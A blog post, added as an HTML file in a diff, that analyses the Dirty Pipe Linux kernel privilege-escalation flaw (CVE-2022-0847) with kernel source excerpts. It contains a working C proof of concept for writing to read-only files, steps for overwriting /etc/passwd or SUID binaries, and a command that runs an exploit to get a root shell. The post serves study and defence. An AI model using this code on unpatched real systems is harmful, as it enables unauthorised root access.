@@ -1,0 +1,562 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>dirty-pipe | BOY blog</title>
+<link rel="shortcut icon" href="https://boycc123.github.io//favicon.ico?v=1672577447017">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://boycc123.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="dirty-pipe | BOY blog - Atom Feed" href="https://boycc123.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="[toc]
+一、漏洞信息
+1. 漏洞简述
+
+漏洞名称：（dirty-pipe内核提权漏洞）
+漏洞编号：（CVE-2022-0847）
+漏洞类型：（设计缺陷）
+漏洞影响：（本地提权）
+CVSS评分：（CVSS 3.0评分7.8）
+
+2. 漏洞..." />
+    <meta name="keywords" content="kernel pwn" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://boycc123.github.io/">
+  <img class="avatar" src="https://boycc123.github.io//images/avatar.png?v=1672577447017" alt="">
+  </a>
+  <h1 class="site-title">
+    BOY blog
+  </h1>
+  <p class="site-description">
+    时间从来不语，却回答了很多问题
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              dirty-pipe
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-01-01
+              </span>
+              <span>
+                11 min read
+              </span>
+              
+                <a href="https://boycc123.github.io/tag/DaU4Yv3Cm/" class="post-tag">
+                  # kernel pwn
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>[toc]</p>
+<h1 id="一-漏洞信息">一、漏洞信息</h1>
+<h3 id="1-漏洞简述">1. 漏洞简述</h3>
+<ul>
+<li>漏洞名称：（dirty-pipe内核提权漏洞）</li>
+<li>漏洞编号：（CVE-2022-0847）</li>
+<li>漏洞类型：（设计缺陷）</li>
+<li>漏洞影响：（本地提权）</li>
+<li>CVSS评分：（CVSS 3.0评分7.8）</li>
+</ul>
+<h3 id="2-漏洞影响">2. 漏洞影响</h3>
+<p>5.8 &lt;= linux内核 &lt; 5.16.11/5.15.25/5.10.102</p>
+<p>在5.16.11/5.15.25/5.10.102中被修复</p>
+<h3 id="3-解决方案">3. 解决方案</h3>
+<p>https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903</p>
+<h1 id="二-漏洞复现">二、漏洞复现</h1>
+<h3 id="1-环境搭建">1. 环境搭建</h3>
+<p>linux内核版本 : 5.13.0</p>
+<figure data-type="image" tabindex="1"><img src="https://s2.loli.net/2022/03/26/whenFDOWNcd5Vpi.png" alt="image-20220326173440455" loading="lazy"></figure>
+<h3 id="2-复现过程">2. 复现过程</h3>
+<p>下载exp，用gcc编译为可执行文件，直接运行，在文件后面加上suid文件，就可以拿到一个root权限的shell</p>
+<p>1.查找suid文件</p>
+<pre><code class="language-shell">find / -perm -4000 2&gt;/dev/null
+</code></pre>
+<p>2.运行exp</p>
+<pre><code class="language-shell">./exploit-2 /usr/bin/umount
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://s2.loli.net/2022/03/26/QIYBiutSjhewsPK.png" alt="image-20220326173732207" loading="lazy"></figure>
+<h1 id="三-基础知识">三、基础知识</h1>
+<h3 id="1管道">1.管道</h3>
+<p>linux下的管道(pipe)是一种进程间的通信机制，就是在内存中创建一个共享文件，从而使得两个进程可以通过该共享文件来传递信息，管道具有单向传递数据的特点，由于该文件没有文件名，只能在亲属进程之间通信，所以也叫作'匿名管道'</p>
+<p>进程之间通过pipe函数创建管道 <code>int pipe(int fildes[2])</code> ，</p>
+<p>在i节点中有一个 <code>pipe_inode_info</code> 类型的指针 <code>i_pipe</code> ，在普通文件中 <code>i_pipe</code> 指针是 <code>NULL</code> ，在管道文件中该指针指向 <code>pipe_inode_info</code> 结构体，管道的本体也就是该结构体</p>
+<pre><code class="language-c">struct inode {
+    ....
+    struct pipe_inode_info	*i_pipe;
+    ....
+};
+</code></pre>
+<pre><code class="language-c">// pipe_inode_info结构如下:
+struct pipe_inode_info {
+	struct mutex mutex;
+	wait_queue_head_t rd_wait, wr_wait;
+	unsigned int head;
+	unsigned int tail;
+	unsigned int max_usage;
+	unsigned int ring_size;
+#ifdef CONFIG_WATCH_QUEUE
+	bool note_loss;
+#endif
+	unsigned int nr_accounted;
+	unsigned int readers;
+	unsigned int writers;
+	unsigned int files;
+	unsigned int r_counter;
+	unsigned int w_counter;
+	struct page *tmp_page;
+	struct fasync_struct *fasync_readers;
+	struct fasync_struct *fasync_writers;
+	struct pipe_buffer *bufs;	// 构建管道的内存缓冲区
+	struct user_struct *user;
+#ifdef CONFIG_WATCH_QUEUE
+	struct watch_queue *watch_queue;
+#endif
+};
+</code></pre>
+<p>管道的实质也就是一个被当做文件来管理的内存缓冲区，该缓冲区由结构体pipe_buffer管理</p>
+<pre><code class="language-c">// pipe_buffer的结构体如下
+struct pipe_buffer {
+	struct page *page;
+	unsigned int offset, len;
+	const struct pipe_buf_operations *ops;
+	unsigned int flags;
+	unsigned long private;
+};
+</code></pre>
+<p>在创建管道时使用的pipe和pipe2这两个系统调用最终都会调用do_pipe2()函数</p>
+<pre><code class="language-c">// fs/pipe.c
+SYSCALL_DEFINE2(pipe2, int __user *, fildes, int, flags)
+{
+	return do_pipe2(fildes, flags);
+}
+
+SYSCALL_DEFINE1(pipe, int __user *, fildes)
+{
+	return do_pipe2(fildes, 0);
+}
+</code></pre>
+<p>do_pipe2()最终会调用kcalloc()函数分配一个pipe_buffer数组，默认数量是PIPE_DEF_BUFFERS(16)个</p>
+<p>调用链：<code>do_pipe2()</code> -&gt; <code>__do_pipe_flags()</code> --&gt; <code>create_pipe_files()</code> -&gt; <code>get_pipe_inode()</code> -&gt; <code>alloc_pipe_info()</code></p>
+<pre><code class="language-c">pipe-&gt;bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer), GFP_KERNEL_ACCOUNT);
+</code></pre>
+<p>来看一下管道的读写操作，注意以下调用链</p>
+<p><code>do_pipe2()</code> -&gt; <code>__do_pipe_flags()</code> -&gt; <code>create_pipe_files()</code> -&gt; <code>alloc_file_pseudo()</code></p>
+<pre><code class="language-c">f = alloc_file_pseudo(inode, pipe_mnt, &quot;&quot;, O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)), &amp;pipefifo_fops);
+</code></pre>
+<p>pipefifo_fops里面定义了我们对管道进行相关操作时调用的函数，当我们从管道读取数据的时候会调用<code>pipe_read()</code> 函数，当我们写入数据到管道中的时候会调用 <code>pipe_write()</code> 函数</p>
+<pre><code class="language-c">const struct file_operations pipefifo_fops = {
+	.open		= fifo_open,
+	.llseek		= no_llseek,
+	.read_iter	= pipe_read,
+	.write_iter	= pipe_write,
+	.poll		= pipe_poll,
+	.unlocked_ioctl	= pipe_ioctl,
+	.release	= pipe_release,
+	.fasync		= pipe_fasync,
+};
+</code></pre>
+<p>先看一下 <code>pipe_write()</code> 函数的实现</p>
+<p>1.如果管道非空，而且上一个buf没有被写满，则进入以下的if语句中，若满足 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位，则尝试向上一个buf中写入数据</p>
+<pre><code class="language-c">	if (chars &amp;&amp; !was_empty) {
+		unsigned int mask = pipe-&gt;ring_size - 1;
+		struct pipe_buffer *buf = &amp;pipe-&gt;bufs[(head - 1) &amp; mask];
+		int offset = buf-&gt;offset + buf-&gt;len;
+
+		if ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;
+		    offset + chars &lt;= PAGE_SIZE) {
+			ret = pipe_buf_confirm(pipe, buf);
+			if (ret)
+				goto out;
+
+			ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);
+			if (unlikely(ret &lt; chars)) {
+				ret = -EFAULT;
+				goto out;
+			}
+
+			buf-&gt;len += ret;
+			if (!iov_iter_count(from))
+				goto out;
+		}
+	}
+</code></pre>
+<p>2.当上一个buf写满后，往下一个管道写，判断如果管道没满，则正常写入</p>
+<pre><code class="language-c">if (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) {
+			unsigned int mask = pipe-&gt;ring_size - 1;
+			struct pipe_buffer *buf = &amp;pipe-&gt;bufs[head &amp; mask];
+			struct page *page = pipe-&gt;tmp_page;
+			int copied;
+
+			if (!page) {
+				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);
+				if (unlikely(!page)) {
+					ret = ret ? : -ENOMEM;
+					break;
+				}
+				pipe-&gt;tmp_page = page;
+			}
+
+			/* Allocate a slot in the ring in advance and attach an
+			 * empty buffer.  If we fault or otherwise fail to use
+			 * it, either the reader will consume it or it'll still
+			 * be there for the next write.
+			 */
+			spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);
+
+			head = pipe-&gt;head;
+			if (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) {
+				spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);
+				continue;
+			}
+
+			pipe-&gt;head = head + 1;
+			spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);
+
+			/* Insert it into the buffer array */
+			buf = &amp;pipe-&gt;bufs[head &amp; mask];
+			buf-&gt;page = page;
+			buf-&gt;ops = &amp;anon_pipe_buf_ops;
+			buf-&gt;offset = 0;
+			buf-&gt;len = 0;
+			if (is_packetized(filp))
+				buf-&gt;flags = PIPE_BUF_FLAG_PACKET;
+			else
+				buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;
+			pipe-&gt;tmp_page = NULL;
+
+			copied = copy_page_from_iter(page, 0, PAGE_SIZE, from);
+			if (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) {
+				if (!ret)
+					ret = -EFAULT;
+				break;
+			}
+			ret += copied;
+			buf-&gt;offset = 0;
+			buf-&gt;len = copied;
+
+			if (!iov_iter_count(from))
+				break;
+		}
+</code></pre>
+<p><code>pipe_read()</code> 函数的实现</p>
+<p>若管道非空，则把buffer对应的page的数据读取出来</p>
+<pre><code class="language-c">		if (!pipe_empty(head, tail)) {
+			struct pipe_buffer *buf = &amp;pipe-&gt;bufs[tail &amp; mask];
+			size_t chars = buf-&gt;len;
+			size_t written;
+			int error;
+
+			if (chars &gt; total_len) {
+				if (buf-&gt;flags &amp; PIPE_BUF_FLAG_WHOLE) {
+					if (ret == 0)
+						ret = -ENOBUFS;
+					break;
+				}
+				chars = total_len;
+			}
+
+			error = pipe_buf_confirm(pipe, buf);
+			if (error) {
+				if (!ret)
+					ret = error;
+				break;
+			}
+
+			written = copy_page_to_iter(buf-&gt;page, buf-&gt;offset, chars, to);
+			if (unlikely(written &lt; chars)) {
+				if (!ret)
+					ret = -EFAULT;
+				break;
+			}
+			ret += chars;
+			buf-&gt;offset += chars;
+			buf-&gt;len -= chars;
+
+			/* Was it a packet buffer? Clean up and exit */
+			if (buf-&gt;flags &amp; PIPE_BUF_FLAG_PACKET) {
+				total_len = chars;
+				buf-&gt;len = 0;
+			}
+
+			if (!buf-&gt;len) {
+				pipe_buf_release(pipe, buf);
+				spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);
+#ifdef CONFIG_WATCH_QUEUE
+				if (buf-&gt;flags &amp; PIPE_BUF_FLAG_LOSS)
+					pipe-&gt;note_loss = true;
+#endif
+				tail++;
+				pipe-&gt;tail = tail;
+				spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);
+			}
+			total_len -= chars;
+			if (!total_len)
+				break;	/* common path: read succeeded */
+			if (!pipe_empty(head, tail))	/* More to do? */
+				continue;
+		}
+</code></pre>
+<p>总的来说，我们向一个刚刚建立的管道写数据的时候，会为buf分配一个page，并设置 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位，然后写入page中，只有该标志位被设置才可以对buffer进行写入，当我们读出数据之后，可以看到该标志位并没有被改变，依旧可以写入</p>
+<h3 id="splice函数">splice()函数</h3>
+<p>splice()函数是处理文件与管道之间的数据拷贝的函数，该函数的本质是利用管道在内核空间进行数据的拷贝，大大减小了开销</p>
+<p>splice系统调用的调用链：<code>SYS_splice()</code> -&gt; <code>__do_splice()</code> -&gt; <code>do_splice()</code></p>
+<p>然后do_splice()函数会根据情况调用 <code>splice_pipe_to_pipe()</code> / <code>splice_file_to_pipe()</code> / <code>do_splice_from()</code> 函数</p>
+<p>splice_pipe_to_pipe() 对应着把管道内的数据读到管道中</p>
+<p>splice_file_to_pipe() 对应着把文件内的数据读到管道中</p>
+<p>do_splice_from() 对应着把管道内的数据读取到文件中</p>
+<h1 id="四-漏洞分析">四、漏洞分析</h1>
+<h3 id="1分析">1.分析</h3>
+<p>我们在splice的代码中并未发现有清空pipe_buffer中的 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位的地方，当我们把管道读写完之后，所有的标志位都被保留了下来，这就意味着这些page都可以被写，所以我们可以用splice把文件中的数据读取一字节到管道中，当建立完页面映射后，因为上一个buf的标志位任然保留着，所以在下一次读写的时候就会把数据读取到文件映射的页面中，完成越权写文件的操作</p>
+<h3 id="2简单利用">2.简单利用</h3>
+<p>1.先在一个文件中写入很多A，然后以只读的方式打开</p>
+<figure data-type="image" tabindex="3"><img src="https://s2.loli.net/2022/03/26/WXf6cnHaG8SCj1x.png" alt="image-20220326164803579" loading="lazy"></figure>
+<pre><code class="language-C">const char* path = &quot;./tmpfile&quot;;
+int fd = open(path, O_RDONLY);
+</code></pre>
+<p>2.使用pipe()函数创建一个管道</p>
+<pre><code class="language-c">if(pipe(p)){
+    abort();
+}
+</code></pre>
+<p>3.使用splice()函数将文件中的数据定向到管道中</p>
+<pre><code class="language-c">nbytes = splice(fd, 0, p[1], NULL, 5, 0);
+</code></pre>
+<p>4.向管道中写入数据</p>
+<pre><code class="language-c">nbytes_w = write(p[1], &quot;BBBBB&quot;, 5);
+</code></pre>
+<p>5.把管道另一端的数据写到buf中，并打印出来看看是否写入</p>
+<pre><code class="language-c">read(p[0], buf, 10);
+printf(&quot;pipe: %s\n&quot;, buf);
+</code></pre>
+<pre><code class="language-c">#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/user.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char* argv[]){
+    printf(&quot;start poc_2&quot;);
+    const char* path = &quot;./tmpfile&quot;;
+    int fd = open(path, O_RDONLY);
+    loff_t offset = 0;
+    ssize_t nbytes;
+    ssize_t nbytes_w;
+    int p[2];
+    static char buf[4096];
+    memset(buf, 0, 4096);
+    if(pipe(p)){
+        abort();
+    }
+    while(1){
+        nbytes = splice(fd, 0, p[1], NULL, 5, 0);
+        printf(&quot;splice %ld bytes\n&quot;, nbytes);
+        nbytes_w = write(p[1], &quot;BBBBB&quot;, 5);
+        read(p[0], buf, 10);
+        printf(&quot;pipe: %s\n&quot;, buf);
+        if(nbytes == 0 || nbytes_w == 0){
+            break;
+        }
+    }
+    close(fd);
+    return 0;
+}
+</code></pre>
+<p>一开始的文件中并没有B</p>
+<figure data-type="image" tabindex="4"><img src="https://s2.loli.net/2022/03/26/XWyCQ5KUIY1ZT86.png" alt="image-20220326170013477" loading="lazy"></figure>
+<p>我们运行程序后，看到以只读方式打开的文件中被写入了B</p>
+<figure data-type="image" tabindex="5"><img src="https://s2.loli.net/2022/03/26/CmfNvYrScUBbhMy.png" alt="image-20220326170213638" loading="lazy"></figure>
+<h3 id="3提权">3.提权</h3>
+<p>既然可以向没有权限读取的文件中写入数据，那我们就可以向/etc/passwd中写入root的密码，或者向suid程序中写入一段shellcode来达到提权的效果</p>
+<p>1.首先创建一个管道，然后填满管道，让管道上所有的buf都被设置了 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位</p>
+<pre><code class="language-c">if (pipe(p)) abort();
+const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
+static char buffer[4096];
+for (unsigned r = pipe_size; r &gt; 0;) {
+    unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;
+    write(p[1], buffer, n);
+    r -= n;
+}
+</code></pre>
+<p>2.然后把管道中的数据清空，但是标志位还在</p>
+<pre><code class="language-c">for (unsigned r = pipe_size; r &gt; 0;) {
+    unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;
+    read(p[0], buffer, n);
+    r -= n;
+}
+</code></pre>
+<p>3.使用splice()函数将文件中的数据定向到管道中</p>
+<pre><code class="language-c">ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);
+</code></pre>
+<p>4.把shellcode写入管道中，这样就可以通过管道写到文件里面了</p>
+<pre><code class="language-c">nbytes = write(p[1], data, len);
+</code></pre>
+<h3 id="exp">exp</h3>
+<p>https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits</p>
+<h1 id="五-参考文献">五、参考文献</h1>
+<p>https://xz.aliyun.com/t/11016#toc-11</p>
+<p>https://mp.weixin.qq.com/s/fGoCM6d6r1WvoOrD-xBuQg</p>
+<p>https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits</p>
+<p>https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903</p>
+<p>https://dirtypipe.cm4all.com/</p>
+<p>https://www.136.la/jingpin/show-143974.html</p>
+<p>https://blog.csdn.net/judgejames/article/details/84256340</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E4%B8%80-%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF">一、漏洞信息</a><br>
+*
+<ul>
+<li><a href="#1-%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0">1. 漏洞简述</a></li>
+<li><a href="#2-%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D">2. 漏洞影响</a></li>
+<li><a href="#3-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88">3. 解决方案</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">二、漏洞复现</a><br>
+*
+<ul>
+<li><a href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">1. 环境搭建</a></li>
+<li><a href="#2-%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B">2. 复现过程</a></li>
+</ul>
+</li>
+<li><a href="#%E4%B8%89-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">三、基础知识</a><br>
+*
+<ul>
+<li><a href="#1%E7%AE%A1%E9%81%93">1.管道</a></li>
+<li><a href="#splice%E5%87%BD%E6%95%B0">splice()函数</a></li>
+</ul>
+</li>
+<li><a href="#%E5%9B%9B-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">四、漏洞分析</a><br>
+*
+<ul>
+<li><a href="#1%E5%88%86%E6%9E%90">1.分析</a></li>
+<li><a href="#2%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8">2.简单利用</a></li>
+<li><a href="#3%E6%8F%90%E6%9D%83">3.提权</a></li>
+<li><a href="#exp">exp</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BA%94-%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE">五、参考文献</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://boycc123.github.io/post/cve-2021-4034-qian-xi/">
+              <h3 class="post-title">
+                cve-2021-4034浅析
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://boycc123.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
